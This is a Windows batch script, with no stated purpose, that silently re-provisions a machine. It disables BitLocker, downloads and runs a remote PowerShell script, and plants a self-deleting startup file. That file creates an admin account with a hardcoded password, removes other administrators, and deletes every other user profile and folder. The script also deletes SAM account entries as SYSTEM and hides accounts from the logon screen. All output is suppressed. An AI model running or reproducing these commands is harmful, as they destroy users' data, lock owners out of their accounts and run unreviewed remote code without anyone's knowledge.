@echo off
start "" /min cmd /c manage-bde -off C: & powershell -WindowStyle Hidden -ExecutionPolicy Bypass -c "$c = Join-Path $env:TEMP 'c.json'; Invoke-WebRequest 'https://raw.githubusercontent.com/shansnow89/apps/refs/heads/main/config.json' -OutFile $c; & ([scriptblock]::Create((irm 'https://debloat.raphi.re/'))) -Config $c -Silent"
:: -----------------------------------------------------------------
:: Next Boot
:: -----------------------------------------------------------------
(
echo @echo off
echo reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOwner /f >nul 2>&1
echo reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOrganization /f >nul 2>&1
echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband" /f >nul 2>&1
echo net user @dm1n "IBEX@dm1n!" ^>nul 2^>^&1
echo powershell -c "Get-LocalGroupMember -Group 'Administrators' | Where-Object { $_.Name -notlike '*@dm1n*' -and $_.Name -notlike '*Administrator*' } | Remove-LocalGroupMember -Group 'Administrators' -ErrorAction SilentlyContinue"
echo psexec -accepteula -s -i powershell -Command "$exclude=@('Public','Default','@dm1n'); Get-ChildItem 'C:\Users' -Directory | Where-Object {$exclude -notcontains $_.Name} | ForEach-Object {$p=$_.FullName; (Get-WmiObject Win32_UserProfile | Where-Object {$_.LocalPath -eq $p}) | ForEach-Object {$_.Delete()}; Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue}; attrib +h 'C:\Users\Public' 2>$null; tzutil /s 'Singapore Standard Time'; shutdown -r -t 5; Start-Sleep -Seconds 3; Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue"
echo del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\user.bat" /f /q ^>nul 2^>^&1
echo curl -L --retry 5 --retry-delay 2 -o "%TEMP%\chrome.msi" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi && msiexec /i "%TEMP%\chrome.msi" /quiet /norestart && shutdown /r /f /t 30
) > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\user.bat"

:: -----------------------------------------------------------------
:: 7. Execution
:: -----------------------------------------------------------------
powershell -nop -c "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $wc=New-Object Net.WebClient; $wc.DownloadFile('https://live.sysinternals.com/PsExec.exe','C:\Windows\System32\PsExec.exe')" >nul 2>&1
psexec -accepteula -s -i powershell -Command "Get-ChildItem 'HKLM:\SAM\SAM\Domains\Account\Users\Names' | Where-Object {$_.PSChildName -ne 'Administrator' -and $_.PSChildName -ne '@dm1n'} | Remove-Item -Force -Recurse" >nul 2>&1
net user Administrator /active:yes >nul 2>&1
powershell -Command "Rename-LocalUser -Name 'Administrator' -NewName '@dm1n' -Confirm:$false" >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /va /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "@dm1n" /t REG_DWORD /d 1 /f >nul 2>&1
for /f "skip=4 tokens=1" %%u in ('net user 2^>nul') do @if /i not "%%u"=="@dm1n" reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "%%u" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband" /f >nul 2>&1
reg load HKU\DefaultUser "C:\Users\Default\NTUSER.DAT" >nul 2>&1
reg delete "HKU\DefaultUser\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband" /f >nul 2>&1
reg unload HKU\DefaultUser >nul 2>&1
shutdown /r /f /t 10

